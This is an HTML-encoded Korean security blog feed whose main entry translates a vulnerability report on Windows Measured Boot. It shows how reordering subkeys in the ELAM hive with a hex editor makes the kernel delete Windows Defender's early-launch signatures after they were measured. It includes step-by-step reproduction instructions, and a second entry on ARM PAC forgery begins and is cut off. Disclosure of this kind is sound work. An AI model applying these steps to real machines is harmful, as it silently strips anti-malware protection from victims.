&#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD0A4; &#xC0BD;&#xC785; &#xD6C4; &#xD558;&#xC774;&#xBE0C;&#xC758; &#xB9C8;&#xC6B4;&#xD2B8;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; HEX &#xD3B8;&#xC9D1;&#xAE30;&#xB85C; &#xD558;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC758; &#xD0A4; &#xBAA9;&#xB85D;&#xC758; &#xC21C;&#xC11C;&#xB97C; &#xC784;&#xC758;&#xB85C; &#xBCC0;&#xACBD;&#xD574; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC744; &#xAE68;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;. </p><blockquote><p>&#xC5ED;&#xC790;:<br>&#xD558;&#xC774;&#xBE0C; &#xB9C8;&#xC6B4;&#xD2B8; &#x2192; &#xD45C;&#xC900; API&#xB85C; &#xBE48; &#xD0A4; &#xC0DD;&#xC131; &#x2192; &#xB9C8;&#xC6B4;&#xD2B8; &#xD574;&#xC81C; &#x2192; &#xD558;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC758; &#xD0A4; &#xC21C;&#xC11C; &#xBCC0;&#xACBD;<br>&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p><br><br>&#xC704; &#xC124;&#xBA85;&#xC758; &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798; ELAM &#xD558;&#xC774;&#xBE0C;&#xC758; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC774;&#xD574;&#xAC00; &#xC27D;&#xB2E4;.</p><ol><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li><li>Key: zz<ul><li>No values</li></ul></li></ol><blockquote><p>&#xD0A4; &#xC21C;&#xC11C;&#xB294; &#xB8E8;&#xD2B8; &#xD0A4;&#xC758; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0;&#xC788;&#xB294; &#xD0A4; &#xB178;&#xB4DC; &#xC624;&#xD504;&#xC14B; &#xC21C;&#xC11C;&#xB97C; &#xBC18;&#xC601;</p></blockquote><p>&#xC704;&#xB294; &#xD45C;&#xC900; API &#xD638;&#xCD9C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#x201C;zz&#x201D; &#xD0A4;&#xB97C; &#xC0BD;&#xC785;&#xD55C; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC774;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC6D0;&#xD558;&#xB294; &#xB2E4;&#xC74C; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD574; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC744; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><ol><li>Key: zz<ul><li>No values</li></ul></li><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li></ol><blockquote><p>&#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xB450; &#xC694;&#xC18C;&#xC758; &#xC21C;&#xC11C;&#xB97C; &#xBC18;&#xB300;&#xB85C;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p><br><br>&#xC774;&#xC81C; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC774; &#xAE68;&#xC84C;&#xB2E4;. </p><pre><code class="hljs c">Upcase(<span class="hljs-string">&quot;zz&quot;</span>) &gt; Upcase(<span class="hljs-string">&quot;Windows Defender&quot;</span>)</code></pre><p>Windows Kernel&#xC740; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC774; &#xAE68;&#xC84C;&#xC73C;&#xBBC0;&#xB85C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#x201C;Windows Defender&#x201D;&#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Windows Loader&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC190;&#xC0C1;&#xC744; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0;, &#xCE21;&#xC815;&#xD560; &#xAC12;&#xC774; &#xC5C6;&#xB294; &#x201C;zz&#x201D;&#xD0A4;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xC5B4; &#xC774;&#xBBF8; &#xC0AD;&#xC81C;&#xB41C; &#x201C;Windows Defender&#x201D; &#xD0A4;&#xC5D0; &#xC788;&#xB294; &#x201C;Measured&#x201D;&#xAC12;&#xC744; &#xCE21;&#xC815;&#xD55C;&#xB2E4;. </p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB294; ELAM blob&#xC774; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xC0AD;&#xC81C;&#xB420; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows Loader&#xAC00; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C;&#xC758; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC744; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;.</p><p>&#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xD615;&#xC2DD;&#xC758; &#xD0A4; &#xC774;&#xB984;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xACE0;, Windows Loader&#xC5D0;&#xB294; &#xC801;&#xC808;&#xD55C; &#xB300;&#xC18C;&#xBB38;&#xC790; &#xD14C;&#xC774;&#xBE14;(&#xBB38;&#xC790;&#xB97C; &#xB300;&#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD14C;&#xC774;&#xBE14;)&#xC774; &#xC5C6;&#xC5B4; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; Windows Loader&#xC758; &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC774; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xB41C; &#xAC83;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC6D0;&#xC778;&#xC774; &#xB418;&#xC5C8;&#xB2E4;.</p><p>&#xC720;&#xB2C8; &#xCF54;&#xB4DC; &#xB300;&#xBB38;&#xC790; &#xD14C;&#xC774;&#xBE14;&#xC740; Windows Kernel&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xC740; Kernel&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB2E4;. &#xB610;&#xD55C; Loader&#xC5D0;&#xC11C; &#xC644;&#xD654;&#xB41C; &#xAC80;&#xC0AC;&#xB85C; &#xC778;&#xD574; Kernel &#xC774;&#xC804;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xD558;&#xC774;&#xBE0C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAE4C;&#xC9C0; &#xB450; &#xBC88; &#xC218;&#xD589;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.<br>&#xD765;&#xBBF8;&#xB86D;&#xAC8C;&#xB3C4;, &#xD604;&#xC7AC; &#xAD6C;&#xD604;&#xC73C;&#xB85C;&#xB294; &#xC720;&#xB2C8; &#xCF54;&#xB4DC; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD574; &#xB9AC;&#xD329;&#xD1A0;&#xB9C1; &#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; NLS &#xD14C;&#xC774;&#xBE14;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xAE30; &#xC804;&#xC5D0; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xB85C;&#xB4DC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. </p><h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft&#xB294; Windows Loader&#xC5D0; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C; &#xAC80;&#xC0AC;&#xB97C; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD588;&#xB2E4;. &#xC720;&#xB2C8; &#xCF54;&#xB4DC; &#xB300;&#xBB38;&#xC790; &#xD14C;&#xC774;&#xBE14;&#xC740; Windows Loader&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; ASCII &#xBB38;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD0A4; &#xC774;&#xB984;&#xC73C;&#xB85C;&#xB9CC; &#xC81C;&#xD55C;&#xB41C;&#xB2E4;. &#xD604;&#xC7AC; &#xD0A4; &#xC774;&#xB984;&#xC5D0; ASCII &#xBB38;&#xC790; &#xC678;&#xC758; &#xD615;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB41C;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xD328;&#xCE58;&#xB294; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xAC80;&#xC0AC;&#xD560; &#xB54C; &#xC2EC;&#xAC01;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC190;&#xC0C1; &#xBB38;&#xC81C;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB41C;&#xB2E4;. SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xC911;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xB098; ASCII &#xBB38;&#xC790; &#xC678; &#xD615;&#xC2DD;&#xC758; &#xD0A4;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>Windows Loader&#xC758; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBE44;&#xAD50; &#xD568;&#xC218;&#xB294; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xB300;&#xBB38;&#xC790; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ASCII &#xC678;&#xC758; &#xBB38;&#xC790;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xB2E4;. &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; Windows Kernel&#xC5D0;&#xC11C; &#xB450; &#xAC1C;&#xC758; &#xD0A4; &#xC774;&#xB984; (&#xB300;&#xC18C; &#xBB38;&#xC790; &#xAD6C;&#xBD84; &#xC5C6;&#xC74C;)&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2017.png" alt="measured-boot-vuln/Untitled%2017.png"></p><blockquote><p>&#xC720;&#xB2C8; &#xCF54;&#xB4DC; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD568;&#xC218;</p></blockquote><p>&#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; &#x201C;z&#x201D;(&#x201C;a&#x201D;+ 0x19) &#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC9C4; &#xBB38;&#xC790;&#xC758; &#xACBD;&#xC6B0; &#xBCC0;&#xD658;&#xC774; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#x201C;&#x44F;&#x201D;&#xC758; &#xB300;&#xBB38;&#xC790; &#xBC84;&#xC804;&#xC740; &#x201C;&#x42F;&#x201D;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#x201C;&#x44F;&#x201D;&#xC774; &#xB41C;&#xB2E4;.</p><p>Windows Kernel&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB41C; &#xB3D9;&#xC77C;&#xD55C; &#xD568;&#xC218;&#xB294; &#xC720;&#xB2C8; &#xCF54;&#xB4DC; &#xB300;&#xBB38;&#xC790; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#x201C;&#x44F;&#x201D;&#xC758; &#xB300;&#xBB38;&#xC790; &#xBC84;&#xC804;&#xC740; &#x201C;&#x42F;&#x201D;&#xB85C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xC774; &#xB41C;&#xB2E4;. SYSTEM &#xD558;&#xC774;&#xBE0C; &#xB0B4;&#xC758; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C;&#xB294; &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xC815;&#xB82C;&#xB418;&#xB098; &#xBD80;&#xD305;&#xD558;&#xB294; &#xB3D9;&#xC548;&#xC5D0;&#xB294; Windows Loader&#xC758; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; Windows Loader&#xB294; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xC815;&#xB82C;&#xB41C; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC744; &#xC190;&#xC0C1;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xD574; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD55C;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC774;&#xC288;&#xB97C; &#xC7AC;&#xD604;&#xD558;&#xB824;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; &#xC0C1;&#xC704; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4; &#xC544;&#xB798;&#xC758; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xC774;&#xB984;&#xC774; &#x201C;&#x44F;1&#x201D;&#xBC0F; &#x201C;&#x42F;2&#x201D;&#xC778; &#xB450; &#xAC1C;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xB9CC;&#xB4E0; &#xB2E4;&#xC74C; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC7AC;&#xBD80;&#xD305;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.  Windows Kernel&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xB82C;&#xB41C;&#xB2E4;.</p><ol><li><em>&#x44F;1</em></li><li><em>&#x42F;2</em></li></ol><p>Windows Loader&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC778;&#xC2DD;&#xD55C;&#xB2E4;. Loader&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC815;&#xB82C;&#xC744; &#xC190;&#xC0C1;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC778;&#xC2DD;&#xD574; &#xBD80;&#xD305; &#xD6C4; &#x201C;&#x42F;2&#x201D;&#xD0A4;&#xAC00; &#xC0AD;&#xC81C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">Upcase (<span class="hljs-string">&quot;&#x44F;1&quot;</span>)&gt; Upcase (<span class="hljs-string">&quot;&#x42F;2&quot;</span>), Upcase (<span class="hljs-string">&quot;&#x44F;1&quot;</span>) = <span class="hljs-string">&quot;&#x44F;1&quot;</span></code></pre><p>Microsoft&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD655;&#xC778;&#xD588;&#xC9C0;&#xB9CC; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB0AC;&#xB2E4;&#xB294; &#xC774;&#xC720;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><h3 id="Original-vulnerability-report-1"><a href="#Original-vulnerability-report-1" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryA malicious usermode program can modify the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), so its blobs (registry values called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;) are correctly measured on the next boot, but the ELAM driver won&apos;t see them because registry keys containing these blobs are deleted by the NT kernel (even before the BOOT_DRIVER_CALLBACK_FUNCTION callback is registered). This results in proper (expected) PCR values but registry values (the ones previously measured) are absent when the ELAM driver tries to read them. So, the system will boot without proper ELAM signatures and this won&apos;t affect the measured boot.# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.2. Add the &quot;zz&quot; key under the root key of the ELAM hive, don&apos;t assign any values to this key (see: &quot;01-regedit.png&quot;).<span class="hljs-number">3.</span> Unmount the ELAM hive.4. Open the ELAM hive file in a HEX editor (you can open it because it&apos;s not loaded), locate the subkeys list (subkeys of the root key), move the &quot;zz&quot; key to the first position on that list. (A key that was the first one before the move should now occupy the second position on the list. If there are three subkeys, just exchange the first and last keys on the list.)The idea is to <span class="hljs-keyword">break</span> the lexicographical order of subkeys. So, <span class="hljs-string">&quot;1 2&quot;</span> becomes <span class="hljs-string">&quot;2 1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;1 2 3&quot;</span> becomes <span class="hljs-string">&quot;3 2 1&quot;</span> (see: <span class="hljs-string">&quot;02-hexeditor-intact.png&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;03-hexeditor-modified.png&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;before&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;after&quot;</span> states of the hive file respectively).<span class="hljs-number">5.</span> Reboot the system.6. When the Windows loader (winload.exe or winload.efi) reads the ELAM hive, it doesn&apos;t check the lexicographical order of subkeys (see: &quot;04-leaf-as-loaded-by-winload.png&quot;). It&apos;s okay for the Windows loader if subkeys are stored in a wrong order.7. When the Windows loader measures the ELAM hive (in the OslpMeasureEarlyLaunchHive routine), it reads subkeys one-by-one and measures their values (called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;).8. If you manage to break the lexicographical order of subkeys by inserting empty keys and keeping real (non-empty) keys in the same order (relative to each other, not counting the empty keys), then the Windows loader will measure the usual (expected) data. This can be easily demonstrated with one key &#x2013; &quot;Windows Defender&quot;. If you insert the <span class="hljs-string">&quot;zz&quot;</span> key <span class="hljs-keyword">using</span> a registry editor, it goes to the end of the subkeys <span class="hljs-built_in">list</span>. Like <span class="hljs-keyword">this</span>:- Windows Defender- zzIf you move the &quot;zz&quot; key to the top (using a HEX editor), the lexicographical order is broken, but since the &quot;zz&quot; key has no values, it doesn&apos;t get measured. And the &quot;Windows Defender&quot; is measured as usual.9. When the NT kernel starts, it takes hives attached to the loader parameter block and validates them. At this point, the validation routine checks the lexicographical order. If a subkeys list isn&apos;t sorted, offending keys are removed from the list (see: &quot;05-leaf-as-loaded-by-kernel.png&quot;, &quot;06-leaf-as-loaded-by-kernel.png&quot;, and &quot;07-leaf-after-check-by-kernel.png&quot;). This means that the <span class="hljs-string">&quot;Windows Defender&quot;</span> key from the example above is removed.10. When the ELAM driver tries to locate its signatures, they are gone &#x2013; they were removed by the NT kernel because of the hive format violation (see: &quot;08-leaf-as-seen-by-elam.png&quot;).## Possible solutionsEither check the lexicographical order of subkeys in the Windows loader (which requires you to pick the NLS tables first) or measure empty keys together with non-empty ones.</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAD00;&#xB828; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; &#xC544;&#xB798;&#xC5D0; &#xCCA8;&#xBD80;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2018.png" alt="measured-boot-vuln/Untitled%2018.png"></p><blockquote><p>01-regedit.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2019.png" alt="measured-boot-vuln/Untitled%2019.png"></p><blockquote><p>02-hexeditor-intact.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2020.png" alt="measured-boot-vuln/Untitled%2020.png"></p><blockquote><p>03-hexeditor-modified.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2021.png" alt="measured-boot-vuln/Untitled%2021.png"></p><blockquote><p>04-leaf-as-loaded-by-winload.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2022.png" alt="measured-boot-vuln/Untitled%2022.png"></p><blockquote><p>05-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2023.png" alt="measured-boot-vuln/Untitled%2023.png"></p><blockquote><p>06-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2024.png" alt="measured-boot-vuln/Untitled%2024.png"></p><blockquote><p>07-leaf-after-check-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2025.png" alt="measured-boot-vuln/Untitled%2025.png"></p><blockquote><p>08-leaf-as-seen-by-elam.png</p></blockquote><hr>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>malware</tag>
      
      <tag>L0ch</tag>
      
      <tag>boot security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PAC와 PAC Forgery</title>
    <link href="/2021/06/27/j0ker/2021-06-27/"/>
    <url>/2021/06/27/j0ker/2021-06-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/">https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/</a> </p></li><li><p><a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&gt; ARMv8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fabu1ous&#xB2D8;&#xC774; &#xB9D0;&#xB3C4; &#xC5C6;&#xC774; &#xC81C;&#xAC00; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xB85C; &#xC4F0;&#xB824;&#xB358; &#xC8FC;&#xC81C;&#xB97C; &#xC5B4;&#xC81C; &#xC368;&#xBC84;&#xB9AC;&#xB294; &#xBC14;&#xB78C;&#xC5D0;&#x2026; &#xC624;&#xB298;&#xC740; <code>PAC</code>&#xC640; <code>PAC Forgery</code>&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>PAC</code>&#xB294; <code>Pointer Authentication Code</code>&#xC758; &#xC57D;&#xC790;&#xB85C;, &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD3EC;&#xC778;&#xD130;&#xB4E4;&#xC744; &#xC778;&#xC99D;&#xD558;&#xB294; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. <code>ARMv8.3-A</code>&#xBD80;&#xD130; &#xC9C0;&#xC6D0;&#xD558;&#xBA70; iOS&#xC5D0;&#xC11C; &#xC774; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA74;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xB09C;&#xC774;&#xB3C4;&#xAC00; &#xB9CE;&#xC774; &#xC62C;&#xB77C;&#xAC14;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC608;&#x2026; &#xC800;&#xB294; &#xC548;&#xD574;&#xBD10;&#xC11C; &#xC5BC;&#xB9C8;&#xB098; &#xC5B4;&#xB824;&#xC6B4;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694;&#x2026;?</p></blockquote><p>&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xC9C0;&#xC6D0;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC5EC;&#xBD80;&#xB294; &#xC81C;&#xB300;&#xB85C; &#xD655;&#xC778;&#xC744; &#xBABB;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ARMv9</code>&#xB85C; &#xB098;&#xC624;&#xB294; Cortex CPU&#xC5D0;&#xC11C; <code>PAC</code>&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/first-armv9-cpu-cores">&#xAE30;&#xC0AC;</a>&#xB97C; &#xBD24;&#xB294;&#xB370;, &#xD639;&#xC2DC; &#xC544;&#xC2DC;&#xB294; &#xBD84;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xB313;&#xAE00; &#xB2EC;&#xC544;&#xC8FC;&#xC138;&#xC694; &#x315C;&#x315C;</p><p><code>PAC</code>&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xB9E4;&#xC6B0; &#x201C;&#xAC04;&#xB2E8;&#x201D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800;, pac&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;(ex. <code>paciasp</code>, <code>pacia</code>)&#xB97C; &#xD1B5;&#xD574; context&#xC640; key &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC774;&#xC6A9;&#xD574; sign&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;, key&#xB294; 128&#xBE44;&#xD2B8; &#xAC12;&#xC774;&#xBA70; 